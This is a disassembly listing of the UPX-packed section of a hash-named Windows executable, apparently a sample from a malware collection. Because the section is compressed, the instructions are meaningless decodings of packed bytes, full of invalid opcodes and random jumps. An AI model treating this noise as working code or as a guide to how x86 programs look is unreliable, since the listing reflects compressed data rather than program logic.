
7df70b8c0ac04259b3586c084cccfcd088aee66a4892e4b73771643042ee11ac.exe:     file format pei-i386


Disassembly of section UPX1:

0050d000 <UPX1>:
  50d000:	sbb    al,BYTE PTR [ebx]
  50d002:	add    BYTE PTR [eax],al
  50d004:	outs   dx,DWORD PTR ds:[esi]
  50d005:	std    
  50d006:	sti    
  50d007:	outs   dx,BYTE PTR ds:[esi]
  50d008:	popa   
  50d009:	sub    edx,0x4d
  50d00c:	or     BYTE PTR [ebx+ebx*1],0xe6
  50d010:	mov    ss,WORD PTR [edx]
  50d012:	addr16 jbe 0x50d02c
  50d015:	lock call 0x8b59:0xa29cef5e
  50d01d:	cdq    
  50d01e:	mov    eax,DWORD PTR [edi]
  50d020:	sbb    cl,BYTE PTR [eax+0x14023428]
  50d026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50d027:	ror    ebx,0xa
  50d02a:	ds jecxz 0x50d08c
  50d02d:	ja     0x50d0ab
  50d02f:	fsubp  st(5),st
  50d031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50d032:	dec    esi
  50d033:	(bad)  
  50d034:	dec    ebp
  50d035:	out    0x61,al
  50d037:	dec    ecx
  50d038:	adc    BYTE PTR [ebp+edx*4-0x53],bh
  50d03c:	out    0x75,eax
  50d03e:	pop    ebx
  50d03f:	test   BYTE PTR [edi],0x11
  50d042:	ucomiss xmm1,DWORD PTR [ebx-0x12]
  50d046:	sbb    bl,ah
  50d048:	aaa    
  50d049:	cmp    al,0x74
  50d04b:	pusha  
  50d04c:	inc    esi
  50d04d:	(bad)  
  50d04f:	push   ebp
  50d050:	mov    ch,0xea
  50d052:	jecxz  0x50d04c
  50d054:	pop    es
  50d055:	das    
  50d056:	jmp    0xeeab:0xd82de4d8
  50d05d:	fcom   QWORD PTR [edi]
  50d05f:	and    al,0x14
  50d061:	mov    WORD PTR [esi+0x1f828ce6],ss
  50d067:	das    
  50d068:	mov    cl,0x68
  50d06a:	nop
  50d06b:	cli    
  50d06c:	push   ebp
  50d06d:	sbb    al,0xce
  50d06f:	shl    DWORD PTR [ebx+0x49],cl
  50d072:	dec    esp
  50d073:	int3   
  50d074:	or     ebp,DWORD PTR ds:0xf3929a8
  50d07a:	(bad)  
  50d07c:	mov    ebx,DWORD PTR [eax-0x14d86b85]
  50d082:	xchg   dh,cl
  50d084:	adc    al,0xd0
  50d086:	rcr    BYTE PTR [ebp+0x3f],cl
  50d089:	data16 hlt 
  50d08b:	adc    al,0x21
  50d08d:	cmp    edi,esi
  50d08f:	sbb    bl,BYTE PTR [esi+0x606bedc1]
  50d095:	nop
  50d096:	adc    BYTE PTR [eax-0x5f608234],al
  50d09c:	mov    ebp,0x17ddbbe4
  50d0a1:	mov    ah,0x45
  50d0a3:	or     DWORD PTR [esi],edx
  50d0a5:	shr    DWORD PTR [ebx-0x39fd7ba0],0x4a
  50d0ac:	adc    eax,0x14174d10
  50d0b1:	fild   QWORD PTR [ebx+0xb231ca9]
  50d0b7:	je     0x50d12a
  50d0b9:	xlat   BYTE PTR ds:[ebx]
  50d0ba:	mov    edi,0xd198752d
  50d0bf:	std    
  50d0c0:	pop    DWORD PTR [ebx-0x1b92a076]
  50d0c6:	push   ds
  50d0c7:	aam    0x55
  50d0c9:	add    ah,bh
  50d0cb:	(bad)
  50d0ce:	aad    0xe1
  50d0d0:	aas    
  50d0d1:	add    BYTE PTR [esi*2-0x7d2a6a17],0x5e
  50d0d9:	mov    ebx,0x9f162c03
  50d0de:	retf   
  50d0df:	cld    
  50d0e0:	in     al,dx
  50d0e1:	xor    esp,DWORD PTR [esi+edi*4+0xf]
  50d0e5:	xchg   ebp,eax
  50d0e6:	xchg   bx,ax
  50d0e8:	call   0x4ce3d023
  50d0ed:	add    bl,dh
  50d0ef:	int    0xc4
  50d0f1:	test   DWORD PTR [ebx+0xe],ebx
  50d0f4:	js     0x50d07e
  50d0f6:	jp     0x50d0e1
  50d0f8:	sbb    eax,0xb5492b2e
  50d0fd:	ja     0x50d139
  50d0ff:	imul   ebp,DWORD PTR [edx+0x56],0x46
  50d103:	aas    
  50d104:	call   0x4d8b:0x78ddfa40
  50d10b:	call   0xc26cbec4
  50d110:	mov    edi,0x8e0cd816
  50d115:	jmp    0xdd401e79
  50d11a:	popa   
  50d11b:	pushf  
  50d11c:	mov    bh,0x39
  50d11e:	mov    edi,0xfabe1997
  50d123:	mov    ebp,ebp
  50d125:	push   esp
  50d126:	cwde   
  50d127:	or     al,0xfe
  50d129:	mov    edx,0xbd58cd6e
  50d12e:	jecxz  0x50d0d9
  50d130:	in     al,dx
  50d131:	or     BYTE PTR [edi-0x77],dl
  50d134:	fadd   st,st(2)
  50d136:	cdq    
  50d137:	pop    esp
  50d139:	mov    ch,0xb0
  50d13b:	or     esp,eax
  50d13d:	inc    esi
  50d13e:	inc    esp
  50d13f:	dec    ebx
  50d140:	and    DWORD PTR [ebx-0x17],esp
  50d143:	sbb    BYTE PTR [edi],bh
  50d145:	daa    
  50d146:	xchg   esi,eax
  50d147:	add    eax,0xccb63930
  50d14c:	popa   
  50d14d:	dec    esi
  50d14e:	xor    DWORD PTR [ecx+0x37],ebx
  50d151:	pop    edi
  50d152:	lea    eax,[ebp-0x43a8f278]
  50d158:	push   ss
  50d159:	arpl   WORD PTR [edx],cx
  50d15b:	ins    DWORD PTR es:[edi],dx
  50d15c:	sti    
  50d15d:	outs   dx,BYTE PTR ds:[esi]
  50d15e:	pop    eax
  50d15f:	push   esi
  50d160:	xor    DWORD PTR [edi],ebp
  50d162:	popf   
  50d163:	push   ebx
  50d164:	int    0x97
  50d166:	and    al,0xc8
  50d168:	pop    edx
  50d169:	test   al,0x73
  50d16b:	not    BYTE PTR [ebx+0x4401f7ba]
  50d171:	jmp    0x818ee6e6
  50d176:	mov    WORD PTR [eax-0x7311fdfc],?
  50d17c:	or     al,0xe5
  50d17e:	inc    ah
  50d180:	jne    0x50d177
  50d182:	scas   eax,DWORD PTR es:[edi]
  50d183:	mov    eax,DWORD PTR [eax+0x3d80f983]
  50d189:	(bad)  
  50d18a:	push   ss
  50d18b:	in     eax,dx
  50d18c:	xor    bh,BYTE PTR [esi+0x47]
  50d18f:	xor    al,bh
  50d191:	adc    al,ah
  50d193:	inc    edx
  50d194:	fcomip st,st(1)
  50d196:	lods   al,BYTE PTR ds:[esi]
  50d197:	call   0xb92:0xd14d740e
  50d19e:	cli    
  50d19f:	xor    dl,BYTE PTR [ebx]
  50d1a1:	dec    edi
  50d1a2:	loope  0x50d21a
  50d1a4:	fmul   st,st(4)
  50d1a6:	hlt    
  50d1a7:	xchg   al,al
  50d1a9:	dec    ebp
  50d1aa:	cmp    edx,esi
  50d1ac:	imul   edi,eax,0x9d9c2a3e
  50d1b2:	mov    dh,0xbc
  50d1b4:	ret    
  50d1b5:	inc    esi
  50d1b6:	mov    dl,0x5c
  50d1b8:	xor    BYTE PTR [esi+0x70],dh
  50d1bb:	ficomp DWORD PTR [edi-0x19860b50]
  50d1c1:	mov    ds:0x56e1c1b,eax
  50d1c6:	call   0x4bf6:0x5414532e
  50d1cd:	in     eax,dx
  50d1ce:	xchg   ebx,eax
  50d1cf:	sahf   
  50d1d0:	dec    edx
  50d1d1:	pop    ds
  50d1d2:	inc    edi
  50d1d3:	push   cs
  50d1d4:	out    dx,eax
  50d1d5:	sti    
  50d1d6:	xchg   ebx,eax
  50d1d7:	and    eax,0x45fccf02
  50d1dc:	adc    al,0x17
  50d1de:	fisubr DWORD PTR [eax]
  50d1e0:	dec    esp
  50d1e1:	clc    
  50d1e2:	outs   dx,DWORD PTR ds:[esi]
  50d1e3:	add    ebp,DWORD PTR [edi-0x6bfdf682]
  50d1e9:	bound  ebx,QWORD PTR [eax]
  50d1eb:	(bad)  
  50d1ec:	or     cl,al
  50d1ee:	xor    bl,dh
  50d1f0:	scas   eax,DWORD PTR es:[edi]
  50d1f1:	mov    WORD PTR [esi+0x75c0e961],gs
  50d1f7:	add    eax,0x70273064
  50d1fc:	(bad)  
  50d1fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50d1fe:	pusha  
  50d1ff:	push   ebx
  50d200:	adc    al,0x3d
  50d202:	adc    bl,bh
  50d204:	push   ecx
  50d205:	mov    ch,0x15
  50d207:	xchg   BYTE PTR [eax],ch
  50d209:	adc    BYTE PTR [eax+0x6509fade],dl
  50d20f:	rcpps  xmm3,xmm3
  50d212:	gs mov cl,0xf5
  50d215:	inc    ebp
  50d216:	add    BYTE PTR [esp+esi*4-0x52],cl
  50d21a:	outs   dx,DWORD PTR ds:[esi]
  50d21b:	xor    DWORD PTR [ecx+ebp*4+0x3a76db90],0xffffffc1
  50d223:	push   0xffffff9c
  50d225:	cmp    al,BYTE PTR [edx+edx*2]
  50d228:	cmp    al,0xdc
  50d22a:	jg     0x50d20c
  50d22c:	push   0xc4bca938
  50d231:	mov    edx,0x2540f0dd
  50d236:	ror    esp,0x4d
  50d239:	add    al,0x8
  50d23b:	inc    ebx
  50d23c:	inc    esp
  50d23d:	xchg   esi,eax
  50d23e:	enter  0x41c,0xeb
  50d242:	mov    ebx,ds
  50d244:	xchg   esi,eax
  50d245:	popw   ds
  50d247:	xchg   DWORD PTR [edx-0x24],esp
  50d24a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50d24b:	arpl   WORD PTR [edx],bp
  50d24d:	pushf  
  50d24e:	or     cl,BYTE PTR [ebp-0x174ea0f1]
  50d254:	cmc    
  50d255:	int    0x90
  50d257:	leave  
  50d258:	not    DWORD PTR [eax]
  50d25a:	stos   BYTE PTR es:[edi],al
  50d25b:	aaa    
  50d25c:	pop    ebx
  50d25d:	sub    BYTE PTR [ebx],dl
  50d25f:	dec    ebx
  50d260:	or     dl,BYTE PTR [eax-0x2f3586ca]
  50d266:	mov    bl,0xb2
  50d268:	sub    al,0x84
  50d26a:	arpl   di,cx
  50d26c:	ficom  WORD PTR [eax]
  50d26e:	scas   eax,DWORD PTR es:[edi]
  50d26f:	popa   
  50d270:	(bad)  
  50d271:	ja     0x50d2b4
  50d273:	sub    al,0x89
  50d275:	outs   dx,BYTE PTR ds:[esi]
  50d276:	stc    
  50d277:	icebp  
  50d278:	cmp    DWORD PTR [ecx],ecx
  50d27a:	int3   
  50d27b:	inc    ebx
  50d27c:	call   0x93666e5b
  50d281:	pop    ds
  50d282:	ret    
  50d283:	jmp    0x50d2d5
  50d285:	mov    BYTE PTR [edx+0x11fe42df],cl
  50d28b:	and    ch,BYTE PTR [eax+0x51]
  50d28e:	jnp    0x50d29b
  50d290:	cld    
  50d291:	xor    ch,BYTE PTR [esi]
  50d293:	rcl    BYTE PTR [ebx-0x3abafc5],cl
  50d299:	cs jae 0x50d29f
  50d29c:	xchg   edi,eax
  50d29d:	(bad)  
  50d29e:	loop   0x50d29e
  50d2a0:	stc    
  50d2a1:	pushf  
  50d2a2:	inc    eax
  50d2a3:	add    dl,bl
  50d2a5:	mov    dl,0xfb
  50d2a7:	and    edx,eax
  50d2a9:	fcmovnb st,st(4)
  50d2ab:	imul   ebx,DWORD PTR [eax-0x5d94b432],0xffffff8e
  50d2b2:	fxrstor [ebp+0x6cb05c02]
  50d2b9:	jno    0x50d28c
  50d2bb:	sbb    BYTE PTR [ebp+eiz*2+0x42],ah
  50d2bf:	cmp    eax,0xffdcdea9
  50d2c4:	les    esi,FWORD PTR [eax+0x30]
  50d2c7:	mov    esi,0xe5d524b5
  50d2cc:	dec    edi
  50d2cd:	ja     0x50d2aa
  50d2cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50d2d0:	jne    0x50d30d
  50d2d2:	(bad)  
  50d2d3:	dec    ebx
  50d2d4:	cli    
  50d2d5:	lea    ebp,[edx+0x15]
  50d2d8:	sub    dh,BYTE PTR [edi+0x29]
  50d2db:	mov    al,0x50
  50d2dd:	sbb    ch,BYTE PTR [ebx]
  50d2df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50d2e0:	in     al,0xa0
  50d2e2:	mov    dl,0x6c
  50d2e4:	adc    BYTE PTR ds:0x9816a7c4,cl
  50d2ea:	or     cl,BYTE PTR [eax+0x70]
  50d2ed:	push   0xffffffc7
  50d2ef:	xchg   BYTE PTR [eax],ch
  50d2f1:	mov    dh,0x6b
  50d2f3:	jmp    0x779f:0x4ece2599
  50d2fa:	jecxz  0x50d2e2
  50d2fc:	mov    ?,edx
  50d2fe:	scas   al,BYTE PTR es:[edi]
  50d2ff:	mov    ch,0x30
  50d301:	icebp  
  50d302:	fisttp DWORD PTR [esi-0x481dc755]
  50d308:	cs jae 0x50d345
  50d30b:	ins    DWORD PTR es:[edi],dx
  50d30c:	mov    eax,0x8d2fa333
  50d311:	mov    ebx,0x35668b9b
  50d316:	pop    eax
  50d317:	inc    ebx
  50d318:	jmp    0x57ba:0xc490f31c
  50d31f:	into   
  50d320:	out    dx,eax
  50d321:	dec    edx
  50d322:	push   eax
  50d323:	je     0x50d2de
  50d325:	mov    ah,al
  50d327:	jae    0x50d318
  50d329:	mov    eax,ds:0xed93848
  50d32e:	lock aaa 
  50d330:	jae    0x50d398
  50d332:	xor    DWORD PTR [edi],esp
  50d334:	dec    DWORD PTR [ebx]
  50d336:	cli    
  50d337:	adc    al,0xb6
  50d339:	jp     0x50d3ae
  50d33b:	clc    
  50d33c:	ins    BYTE PTR es:[edi],dx
  50d33d:	xchg   esi,eax
  50d33e:	inc    eax
  50d33f:	xchg   ecx,ecx
  50d341:	fcmovbe st,st(5)
  50d343:	enter  0xbcff,0x5b
  50d347:	(bad)  
  50d348:	cmp    BYTE PTR [ebx],dl
  50d34a:	pop    ecx
  50d34b:	fdivr  QWORD PTR [edx-0x11]
  50d34e:	stos   BYTE PTR es:[edi],al
  50d34f:	mov    edi,0x66fe4c7
  50d354:	inc    ecx
  50d355:	not    DWORD PTR [esi]
  50d357:	aaa    
  50d358:	pop    esi
  50d359:	mov    ds,WORD PTR [ebp+0x55]
  50d35c:	(bad)  
  50d35e:	mov    al,BYTE PTR [eax-0x53]
  50d361:	fcomp  QWORD PTR [ecx+ebx*4]
  50d364:	mov    ds:0x59153d11,eax
  50d369:	push   ss
  50d36a:	mov    edx,0xcc2cd237
  50d36f:	jno    0x50d328
  50d371:	mov    esi,0xbc446cf
  50d376:	rcr    BYTE PTR [edi+0x4c],1
  50d379:	mov    bl,cl
  50d37b:	mov    ecx,ebp
  50d37d:	jge    0x50d3ed
  50d37f:	push   cs
  50d380:	sti    
  50d381:	dec    ecx
  50d382:	iret   
  50d383:	scas   eax,DWORD PTR es:[edi]
  50d384:	xlat   BYTE PTR ds:[ebx]
  50d385:	arpl   ax,si
  50d387:	out    dx,eax
  50d388:	rcr    DWORD PTR gs:[ecx-0x3b],cl
  50d38c:	inc    BYTE PTR [esi-0x4e]
  50d38f:	popa   
  50d390:	push   ss
  50d391:	lods   eax,DWORD PTR ds:[esi]
  50d392:	push   ebx
  50d393:	and    esp,DWORD PTR [esi+0x2a3b09aa]
  50d399:	sub    dl,BYTE PTR [ebp+0x470fd7a3]
  50d39f:	cmp    BYTE PTR [eax],cl
  50d3a1:	dec    edi
  50d3a2:	mov    al,0xef
  50d3a4:	pop    edi
  50d3a5:	pop    ss
  50d3a6:	jecxz  0x50d344
  50d3a8:	mov    eax,ds:0xfec72772
  50d3ad:	inc    ebx
  50d3ae:	test   eax,0x619585b1
  50d3b3:	add    BYTE PTR [eax+0x3a411dbf],ah
  50d3b9:	jl     0x50d38c
  50d3bb:	push   edi
  50d3bc:	into   
  50d3bd:	test   al,0x5
  50d3bf:	and    esp,DWORD PTR [edx]
  50d3c1:	inc    ebp
  50d3c2:	mov    edi,0xa08cf8b0
  50d3c7:	push   ebx
  50d3c8:	jno    0x50d3b4
  50d3ca:	ror    BYTE PTR [eax+0x6cd64818],0xed
  50d3d1:	aaa    
  50d3d2:	push   edx
  50d3d3:	jp     0x50d3d0
  50d3d5:	jmp    0x25d5f56a
  50d3da:	fst    QWORD PTR [edi]
  50d3dc:	pop    esi
  50d3dd:	cli    
  50d3de:	pop    edx
  50d3df:	and    eax,0x92bdc569
  50d3e4:	fsubr  DWORD PTR [edi-0x799e224a]
  50d3ea:	hlt    
  50d3eb:	stc    
  50d3ec:	add    al,0xee
  50d3ee:	mov    ds:0xc61d0700,al
  50d3f3:	faddp  st(6),st
  50d3f5:	pop    eax
  50d3f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50d3f7:	imul   ebp,DWORD PTR [edx-0x3886f625],0xffffffd4
  50d3fe:	fild   WORD PTR [eax+0x29]
  50d401:	sbb    edx,0xfe225c84
  50d407:	in     al,dx
  50d408:	leave  
  50d409:	xor    eax,0x6723e693
  50d40e:	test   eax,0x17f43167
  50d413:	pop    edx
  50d414:	cmp    DWORD PTR [ebp+0x293564ce],edx
  50d41a:	mov    ds:0x25d81d8,al
  50d41f:	(bad)  
  50d420:	cmovno edx,DWORD PTR ds:0x6f6a7cb0
  50d427:	mov    eax,0x2ac6d988
  50d42c:	push   edi
  50d42d:	cmp    DWORD PTR [edi-0x42],0xfe63f723
  50d434:	push   edx
  50d435:	xor    edx,ebx
  50d437:	add    DWORD PTR [ebp-0x44],esp
  50d43a:	pop    ecx
  50d43b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50d43c:	jmp    0x50d430
  50d43e:	fadd   st,st(5)
  50d440:	retf   0xe887
  50d443:	leave  
  50d444:	pop    eax
  50d445:	cld    
  50d446:	(bad)  
  50d447:	push   edx
  50d448:	fist   DWORD PTR [ecx-0x1d4af91e]
  50d44e:	jg     0x50d4b9
  50d450:	(bad)  
  50d452:	and    edi,ecx
  50d454:	(bad)  
  50d455:	cmc    
  50d456:	cs mov ebx,0x825d59ad
  50d45c:	push   esi
  50d45d:	bound  esp,QWORD PTR [esi-0x70]
  50d460:	pushf  
  50d461:	in     eax,dx
  50d462:	sahf   
  50d463:	lahf   
  50d464:	xchg   edi,eax
  50d465:	das    
  50d466:	(bad)  
  50d467:	out    dx,eax
  50d468:	add    DWORD PTR [edx*1+0x26b4fd4d],eax
  50d46f:	dec    ecx
  50d470:	jmp    0xee16bc7d
  50d475:	adc    ebx,esp
  50d477:	repz les eax,FWORD PTR [esi+0x2a473e2f]
  50d47e:	stos   DWORD PTR es:[edi],eax
  50d47f:	fadd   st(0),st
  50d481:	xchg   ebx,eax
  50d482:	mov    edi,0xfff56568
  50d487:	clc    
  50d488:	xlat   BYTE PTR ds:[ebx]
  50d489:	(bad)  
  50d48a:	call   0xfe8439e0
  50d48f:	cmc    
  50d490:	fdivr  DWORD PTR [edx+0xf3662ae]
  50d496:	add    al,0x14
  50d498:	or     WORD PTR [ecx+0x289d8b5d],ax
  50d49f:	lea    edx,[ebx+0x3f]
  50d4a2:	mov    dl,0x94
  50d4a4:	lahf   
  50d4a5:	jbe    0x50d519
  50d4a7:	fs pusha 
  50d4a9:	lods   al,BYTE PTR ds:[esi]
  50d4aa:	sbb    DWORD PTR [esi+0x5],edi
  50d4ad:	adc    DWORD PTR [ebp+0x54],ebp
  50d4b0:	jp     0x50d4e9
  50d4b2:	xor    al,0x83
  50d4b4:	retf   0xa5a7
  50d4b7:	and    eax,0x52820041
  50d4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50d4bd:	pop    esi
  50d4be:	jge    0x50d4d2
  50d4c0:	add    ah,ah
  50d4c2:	or     DWORD PTR [edx+eax*8+0x182ceccd],0x91001c0
  50d4cd:	scas   al,BYTE PTR es:[edi]
  50d4ce:	and    eax,0x3f129acc
  50d4d3:	adc    ah,BYTE PTR [eax]
  50d4d5:	jno    0x50d48d
  50d4d7:	test   al,0x7e
  50d4d9:	xor    BYTE PTR [esp+edx*8+0x3f],0x1b
  50d4de:	pop    esi
  50d4df:	aam    0xe1
  50d4e1:	ret    0x8d20
  50d4e4:	xor    al,0x7f
  50d4e6:	mov    dl,0xff
  50d4e8:	pop    ecx
  50d4e9:	mov    ebp,ebp
  50d4eb:	cmc    
  50d4ec:	or     BYTE PTR [eax-0x284124a0],dl
  50d4f2:	cli    
  50d4f3:	mov    dh,0xa3
  50d4f5:	sbb    al,bl
  50d4f7:	outs   dx,BYTE PTR ds:[esi]
  50d4f8:	fs loopne 0x50d515
  50d4fb:	cmp    eax,0x23657760
  50d500:	(bad)  
  50d502:	mov    al,ds:0x308d17ca
  50d507:	cwde   
  50d508:	out    dx,eax
  50d509:	mov    ds:0x8e562954,al
  50d50e:	cmp    ax,0x4e00
  50d512:	fisttp QWORD PTR [ebp-0x59]
  50d515:	in     eax,dx
  50d516:	imul   edi,DWORD PTR [ebp-0x4778ee87],0x1e
  50d51d:	dec    edi
  50d51e:	shld   DWORD PTR [edi],eax,0x5c
  50d522:	mov    es,WORD PTR [edx]
  50d524:	ffreep st(0)
  50d526:	xlat   BYTE PTR ds:[ebx]
  50d527:	adc    eax,0xa63c999e
  50d52c:	add    DWORD PTR [ebp-0x17],edi
  50d52f:	inc    esi
  50d530:	mov    bl,0xf9
  50d532:	popa   
  50d533:	sahf   
  50d534:	sbb    BYTE PTR ds:0x46361d75,0xb4
  50d53b:	inc    edi
  50d53c:	pop    es
  50d53d:	das    
  50d53e:	mov    esi,0x3e5e14b8
  50d543:	push   ebp
  50d544:	and    esi,DWORD PTR [esi-0x65]
  50d547:	pop    eax
  50d548:	jns    0x50d54c
  50d54a:	mov    edx,0xcee04b5
  50d54f:	mov    edx,0x27a28c9d
  50d554:	stc    
  50d555:	pop    eax
  50d556:	test   BYTE PTR [eax-0x22],ch
  50d559:	shr    BYTE PTR [ebx-0x48],0xa8
  50d55d:	dec    ecx
  50d55e:	jb     0x50d582
  50d560:	mov    BYTE PTR [edi],ch
  50d562:	jecxz  0x50d5b3
  50d564:	mov    ebp,0x45a2e3fa
  50d569:	pop    edx
  50d56a:	or     ecx,ecx
  50d56c:	test   BYTE PTR [ecx],ch
  50d56e:	and    dl,bl
  50d570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50d571:	repz mov WORD PTR cs:[esi+0x7e],?
  50d576:	dec    esi
  50d577:	pop    ds
  50d578:	loop   0x50d505
  50d57a:	add    DWORD PTR [esi-0x62],eax
  50d57d:	scas   al,BYTE PTR es:[edi]
  50d57e:	push   es
  50d57f:	jb     0x50d5ef
  50d581:	mov    ebp,0x721e019b
  50d586:	fisub  WORD PTR [ebp+0x4f257954]
  50d58c:	jbe    0x50d580
  50d58e:	ja     0x50d529
  50d590:	push   ebp
  50d591:	mov    esp,DWORD PTR [ecx+0x25]
  50d594:	(bad)  
  50d595:	push   ebp
  50d596:	dec    edi
  50d597:	and    al,0xe5
  50d599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50d59a:	in     al,dx
  50d59b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50d59c:	sub    al,0x7a
  50d59e:	or     al,0x16
  50d5a0:	(bad)  
  50d5a1:	mov    ecx,0xe7413931
  50d5a6:	cwde   
  50d5a7:	xor    DWORD PTR [esi+0x127cca32],edx
  50d5ad:	jge    0x50d531
  50d5af:	(bad)  
  50d5b0:	icebp  
  50d5b1:	sti    
  50d5b2:	into   
  50d5b3:	test   bh,0x91
  50d5b6:	inc    esi
  50d5b7:	outs   dx,DWORD PTR ds:[esi]
  50d5b8:	and    eax,0xa485f9e3
  50d5bd:	dec    esi
  50d5be:	lods   al,BYTE PTR ds:[esi]
  50d5bf:	xchg   edi,eax
  50d5c0:	loop   0x50d573
  50d5c2:	iret   
  50d5c3:	fs int3 
  50d5c5:	push   ss
  50d5c6:	aad    0xc3
  50d5c8:	fisttp QWORD PTR [ecx]
  50d5ca:	xor    dl,BYTE PTR [ebx-0x7d]
  50d5cd:	push   eax
  50d5ce:	mov    ah,0xa
  50d5d0:	pop    esp
  50d5d1:	popf   
  50d5d2:	inc    ebp
  50d5d3:	imul   ebx,eax,0x0
  50d5d6:	arpl   WORD PTR [edx-0x3541d4b1],si
  50d5dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50d5dd:	or     esp,DWORD PTR [edx-0x102e6967]
  50d5e3:	test   cl,ch
  50d5e5:	addr16 pop esp
  50d5e7:	jp     0x50d617
  50d5e9:	hlt    
  50d5ea:	hlt    
  50d5eb:	adc    esp,ebp
  50d5ed:	cs pop ecx
  50d5ef:	inc    ecx
  50d5f0:	mov    esp,0x52136427
  50d5f5:	xchg   edi,eax
  50d5f6:	js     0x50d5ff
  50d5f8:	enter  0x59cf,0x8b
  50d5fc:	fs jbe 0x50d5ec
  50d5ff:	dec    ecx
  50d600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50d601:	adc    edx,DWORD PTR [esi]
  50d603:	xor    al,0x7c
  50d605:	test   al,0x5f
  50d607:	popa   
  50d608:	outs   dx,DWORD PTR ds:[esi]
  50d609:	jge    0x50d641
  50d60b:	jl     0x50d618
  50d60d:	ror    BYTE PTR [ecx-0x3934de14],cl
  50d613:	out    0x30,eax
  50d615:	cmp    ch,BYTE PTR [edi]
  50d617:	std    
  50d618:	xchg   esp,eax
  50d619:	nop
  50d61a:	fwait
  50d61b:	xchg   ecx,edi
  50d61d:	ret    
  50d61e:	adc    al,0xc7
  50d620:	aam    0x76
  50d622:	loope  0x50d5e3
  50d624:	sbb    esp,ebp
  50d626:	push   esi
  50d627:	pop    ebp
  50d628:	sete   BYTE PTR [esi+0x56577ff9]
  50d62f:	pop    ebx
  50d630:	jl     0x50d616
  50d632:	xor    eax,0xba088cca
  50d637:	test   BYTE PTR [edi-0x15ce1dea],cl
  50d63d:	xchg   esp,eax
  50d63e:	pop    ecx
  50d63f:	mov    eax,ds:0xe0a9a778
  50d644:	push   0x31a25110
  50d649:	stos   DWORD PTR es:[edi],eax
  50d64a:	and    eax,0x173099c1
  50d64f:	add    ah,bl
  50d651:	inc    ebx
  50d652:	add    BYTE PTR [edx],ch
  50d654:	xor    al,0x5e
  50d656:	out    0x9f,eax
  50d658:	mov    esp,0x509012a3
  50d65d:	ret    0xbbef
  50d660:	pop    edi
  50d661:	xor    BYTE PTR [eax+edx*1-0x19],0x3b
  50d666:	(bad)  
  50d667:	(bad)  
  50d668:	sbb    ch,BYTE PTR [esi-0x43]
  50d66b:	test   edx,eax
  50d66d:	pop    ss
  50d66e:	pop    ebp
  50d66f:	call   0xa9834bc9
  50d674:	sub    DWORD PTR [eax-0x11],0xffffffc1
  50d678:	pop    edi
  50d67a:	inc    ecx
  50d67b:	dec    esp
  50d67c:	sbb    bh,BYTE PTR [edi]
  50d67e:	push   ebp
  50d67f:	outs   dx,BYTE PTR ds:[esi]
  50d680:	jecxz  0x50d6cc
  50d682:	ret    
  50d683:	mov    ds:0x7b7f838b,al
  50d688:	mov    al,0xfd
  50d68a:	xor    dl,BYTE PTR [ecx+0x22]
  50d68d:	cmp    esp,DWORD PTR [eax-0xc0100fd]
  50d693:	sub    ebp,DWORD PTR [ebx+eiz*4-0x2c]
  50d697:	or     al,0xa2
  50d699:	pop    esi
  50d69a:	sti    
  50d69b:	jmp    0x50d65c
  50d69d:	push   edx
  50d69e:	dec    ebp
  50d69f:	and    DWORD PTR [ebx],ecx
  50d6a1:	es loop 0x50d6e2
  50d6a4:	push   ds
  50d6a5:	bound  esi,QWORD PTR [edi]
  50d6a7:	clc    
  50d6a8:	jb     0x50d674
  50d6aa:	(bad)  
  50d6ab:	out    0xb0,eax
  50d6ad:	push   0xffffff99
  50d6af:	push   edi
  50d6b0:	push   eax
  50d6b1:	dec    edx
  50d6b2:	dec    ebx
  50d6b3:	dec    ebx
  50d6b4:	mov    ebp,0x5ad46c23
  50d6b9:	cmp    cl,BYTE PTR [ebp+0x79]
  50d6bc:	or     DWORD PTR [edx],edi
  50d6be:	rcr    ch,0x4
  50d6c1:	xor    DWORD PTR [edx+0x3b0636d9],esi
  50d6c7:	jnp    0x50d6fd
  50d6c9:	add    ebp,DWORD PTR [ecx+0x6f]
  50d6cc:	test   eax,0xb8ee651f
  50d6d1:	ins    BYTE PTR es:[edi],dx
  50d6d2:	jns    0x50d6eb
  50d6d4:	mov    ecx,0xbd6fd40a
  50d6d9:	mov    DWORD PTR [ecx-0x7a],edx
  50d6dc:	xchg   edi,eax
  50d6dd:	test   DWORD PTR [eax],0x91e35431
  50d6e3:	push   esp
  50d6e4:	mov    ebp,0x89ee17bb
  50d6e9:	xor    ecx,DWORD PTR [ebx+eiz*8-0x47a1164b]
  50d6f0:	inc    ebp
  50d6f1:	inc    edi
  50d6f3:	sgdtd  [edi-0x70794257]
  50d6fa:	cdq    
  50d6fb:	js     0x50d73b
  50d6fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50d6fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50d6ff:	lahf   
  50d700:	sub    DWORD PTR [edx-0x33c66da1],ebp
  50d706:	jbe    0x50d710
  50d708:	dec    esi
  50d709:	inc    edi
  50d70a:	aas    
  50d70b:	aad    0x5e
  50d70d:	outs   dx,BYTE PTR ds:[esi]
  50d70e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50d70f:	cmp    edi,edx
  50d711:	rep stos BYTE PTR es:[edi],al
  50d713:	out    0x8a,al
  50d715:	push   ebp
  50d716:	mov    cl,0x92
  50d718:	xchg   ecx,eax
  50d719:	lods   al,BYTE PTR ds:[esi]
  50d71a:	inc    ebx
  50d71b:	adc    eax,DWORD PTR [ebx]
  50d71d:	jmp    0xaa8d:0x90fe3bdf
  50d724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50d725:	test   esp,edx
  50d727:	xchg   ebp,eax
